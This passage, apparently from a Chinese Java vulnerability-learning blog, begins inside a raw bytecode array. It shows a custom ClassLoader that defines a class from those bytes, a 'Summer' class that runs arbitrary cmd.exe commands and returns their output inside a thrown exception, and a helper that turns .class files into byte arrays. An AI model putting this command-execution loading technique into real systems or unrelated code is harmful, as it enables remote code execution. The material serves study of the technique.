class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">90</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">91</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">93</span>, <span class="number">0</span>, <span class="number">94</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">10</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">69</span>, <span class="number">120</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">112</span>, <span class="number">116</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">95</span>, <span class="number">0</span>, <span class="number">92</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">115</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">108</span>, <span class="number">111</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">117</span>, <span class="number">109</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">79</span>, <span class="number">98</span>, <span class="number">106</span>, <span class="number">101</span>, <span class="number">99</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">40</span>, <span class="number">91</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">21</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">80</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">115</span>, <span class="number">115</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">103</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">102</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">78</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">112</span>, <span class="number">117</span>, <span class="number">116</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">59</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">110</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">99</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">47</span>, <span class="number">67</span>, <span class="number">104</span>, <span class="number">97</span>, <span class="number">114</span>, <span class="number">115</span>, <span class="number">101</span>, <span class="number">116</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">105</span>, <span class="number">111</span>, <span class="number">47</span>, <span class="number">82</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">86</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">100</span>, <span class="number">76</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">40</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">97</span>, <span class="number">112</span>, <span class="number">112</span>, <span class="number">101</span>, <span class="number">110</span>, <span class="number">100</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">40</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">59</span>, <span class="number">41</span>, <span class="number">76</span>, <span class="number">106</span>, <span class="number">97</span>, <span class="number">118</span>, <span class="number">97</span>, <span class="number">47</span>, <span class="number">108</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">47</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">66</span>, <span class="number">117</span>, <span class="number">102</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">59</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">116</span>, <span class="number">111</span>, <span class="number">83</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">103</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">23</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">25</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">42</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">1</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">89</span>, <span class="number">6</span>, -<span class="number">67</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">89</span>, <span class="number">3</span>, <span class="number">18</span>, <span class="number">4</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">4</span>, <span class="number">18</span>, <span class="number">5</span>, <span class="number">83</span>, <span class="number">89</span>, <span class="number">5</span>, <span class="number">43</span>, <span class="number">83</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">77</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">89</span>, <span class="number">44</span>, <span class="number">18</span>, <span class="number">10</span>, -<span class="number">72</span>, <span class="number">0</span>, <span class="number">11</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">78</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">89</span>, <span class="number">45</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">58</span>, <span class="number">4</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">89</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">16</span>, <span class="number">58</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">58</span>, <span class="number">6</span>, <span class="number">25</span>, <span class="number">4</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">89</span>, <span class="number">58</span>, <span class="number">6</span>, -<span class="number">58</span>, <span class="number">0</span>, <span class="number">19</span>, <span class="number">25</span>, <span class="number">5</span>, <span class="number">25</span>, <span class="number">6</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">18</span>, <span class="number">19</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">87</span>, -<span class="number">89</span>, -<span class="number">1</span>, -<span class="number">24</span>, -<span class="number">69</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">89</span>, <span class="number">25</span>, <span class="number">5</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">21</span>, -<span class="number">73</span>, <span class="number">0</span>, <span class="number">22</span>, -<span class="number">65</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">28</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">11</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">15</span>, <span class="number">0</span>, <span class="number">99</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">29</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">76</span>, <span class="number">0</span>, <span class="number">34</span>, <span class="number">0</span>, <span class="number">35</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">0</span>, <span class="number">52</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">2</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">7</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">44</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">48</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">45</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">0</span>, <span class="number">50</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">52</span>,</span><br><span class="line">    };</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException {</span><br><span class="line">        <span class="comment">// 只处理Summer类</span></span><br><span class="line">        <span class="keyword">if</span> (name.equals(testClassName)) {</span><br><span class="line">            <span class="comment">// 调用JVM的defineClass方法定义Summer类</span></span><br><span class="line">            <span class="keyword">return</span> defineClass(testClassName, testClassBytes, <span class="number">0</span>, testClassBytes.length);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.findClass(name);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        <span class="comment">// 创建自定义的类加载器</span></span><br><span class="line">        demo2 loader = <span class="keyword">new</span> demo2();</span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            <span class="comment">// 使用自定义的类加载器加载TestHelloWorld类</span></span><br><span class="line">            Class testClass = loader.loadClass(testClassName);</span><br><span class="line">            <span class="comment">// 反射创建Summer类，等价于 Summer t = new Summer(‘ipconfig);</span></span><br><span class="line">            testClass.getConstructor(String.class).newInstance("ipconfig");</span><br><span class="line">        } <span class="keyword">catch</span> (Exception e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+<p>Summer类代码，这里是将回显结果使用异常类抛出。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Summer</span> </span>{</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">Summer</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> Exception </span>{</span><br><span class="line">        InputStream stream = (<span class="keyword">new</span> ProcessBuilder(<span class="keyword">new</span> String[]{<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>, cmd})).start().getInputStream();</span><br><span class="line">        InputStreamReader streamReader = <span class="keyword">new</span> InputStreamReader(stream, Charset.forName(<span class="string">"gbk"</span>));</span><br><span class="line">        BufferedReader bufferedReader = <span class="keyword">new</span> BufferedReader(streamReader);</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        String line = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">while</span>((line = bufferedReader.readLine()) != <span class="keyword">null</span>) {</span><br><span class="line">            buffer.append(line).append(<span class="string">"\n"</span>);</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> Exception(buffer.toString());</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+
+
+<p><img src="https://img-blog.csdnimg.cn/20200605102043439.gif" alt="在这里插入图片描述"></p>
+<hr>
+<p>   工具类将<code>.class</code>字节码文件转化成字节数组，可以添加自定义改造成适合自己方法。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FiletoBytes</span> </span>{</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">FiletoBytes</span><span class="params">(String file_name)</span> </span>{</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 14:39</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    只需要传入文件的绝对路径就可以进行转化</span></span><br><span class="line"><span class="comment">     *  需要根据文件大小修改bytes大小</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename )</span></span>{</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 20m</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">4096</span>];</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        } <span class="keyword">catch</span> (FileNotFoundException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Author</span>:         summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@CreateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateUser</span>:     summer</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateDate</span>:     2020/5/26 15:20</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@UpdateRemark</span>:   修改内容</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Version</span>:        v1.0.0</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Description</span>:    bytes大小需要传入设置</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">FiletoBytes</span><span class="params">(String filename ,<span class="keyword">byte</span>[] bytes)</span></span>{</span><br><span class="line">        String buf = <span class="keyword">null</span>;</span><br><span class="line">        File file = <span class="keyword">new</span> File(filename);</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> {</span><br><span class="line">            fis = <span class="keyword">new</span> FileInputStream(file);</span><br><span class="line"></span><br><span class="line">            fis.read(bytes);</span><br><span class="line">            buf = Arrays.toString(bytes);</span><br><span class="line">            fis.close();</span><br><span class="line">            <span class="keyword">return</span> buf;</span><br><span class="line">        } <span class="keyword">catch</span> (FileNotFoundException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        } <span class="keyword">catch</span> (IOException e) {</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span> buf;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>简单使用demo，将Summer.class文件转化。</p>
+<figure class="highlight java"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">demo1</span> </span>{</span><br><span class="line">    <span class="comment">// Summer.class的绝对路径</span></span><br><span class="line">    <span class="comment">// E:\Soures\JavaLearnVulnerability\Summer.class自行修改</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> String file_name = <span class="string">"E:"</span> + File.separator + <span class="string">"Soures"</span> + File.separator + <span class="string">"JavaLearnVulnerability"</span> + File.separator + <span class="string">"Summer.class"</span>;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1600</span>];</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>{</span><br><span class="line">        FiletoBytes filetoBytes = <span class="keyword">new</span> FiletoBytes(file_name);</span><br><span class="line"><span class="comment">//        System.out.println("直接传入文件，默认bytes大小默认为4kb");</span></span><br><span class="line"><span class="comment">//        System.out.println(filetoBytes.FiletoBytes(file_name));</span></span><br><span class="line">        System.out.println(<span class="string">"传入文件和bytes"</span>);</span><br><span class="line">        